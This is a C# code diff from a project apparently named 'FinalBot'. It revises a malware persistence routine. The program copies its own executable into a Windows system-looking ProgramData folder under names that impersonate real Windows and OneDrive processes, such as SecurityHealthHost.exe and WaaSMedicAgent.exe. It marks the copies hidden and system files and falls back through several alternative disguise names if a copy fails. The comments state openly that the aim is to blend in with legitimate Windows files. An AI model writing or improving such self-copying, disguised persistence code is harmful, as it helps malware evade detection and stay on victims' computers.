@@ -16,10 +16,11 @@ namespace FinalBot
                 string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                 if (string.IsNullOrEmpty(selfPath)) return;
 
-                // Target directory: blends in with real Windows Update files
-                string localData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-                string targetDir = Path.Combine(localData, "Microsoft", "Windows", "UpdateService");
-                string targetPath = Path.Combine(targetDir, "svchost.exe");
+                // Stage 1: Legitimate Path Transition (ProgramData)
+                string programData = Environment.GetEnvironmentVariable("ProgramData");
+                if (string.IsNullOrEmpty(programData)) programData = @"C:\ProgramData";
+                string targetDir = Path.Combine(programData, "Microsoft", "Windows", "SystemData");
+                string targetPath = Path.Combine(targetDir, "SecurityHealthHost.exe");
 
                 if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
 
@@ -39,11 +40,27 @@ namespace FinalBot
                         File.Copy(selfPath, targetPath, true);
                         File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
                     }
-                    catch (Exception ex)
+                    catch (Exception)
                     {
-                        Logger.Warn($"[PERSISTENCE] Initial copy failed: {ex.Message}. Using alternative name.");
-                        targetPath = Path.Combine(targetDir, $"OneDriveUpdate_{Guid.NewGuid().ToString().Substring(0, 8)}.exe");
-                        File.Copy(selfPath, targetPath, true);
+                        // Attempt multiple names just in case
+                        string[] altNames = { "OneDriveUpdate.exe", "SecurityHealthClient.exe", "WindowsMediaModule.exe", "WaaSMedicAgent.exe" };
+                        bool copied = false;
+                        foreach (var alt in altNames)
+                        {
+                            try {
+                                string altPath = Path.Combine(targetDir, alt);
+                                File.Copy(selfPath, altPath, true);
+                                File.SetAttributes(altPath, FileAttributes.Hidden | FileAttributes.System);
+                                targetPath = altPath;
+                                copied = true;
+                                break;
+                            } catch { }
+                        }
+                        if (!copied)
+                        {
+                            targetPath = Path.Combine(targetDir, $"svc_{Guid.NewGuid().ToString().Substring(0, 8)}.exe");
+                            File.Copy(selfPath, targetPath, true);
+                        }
                     }
                 }
 
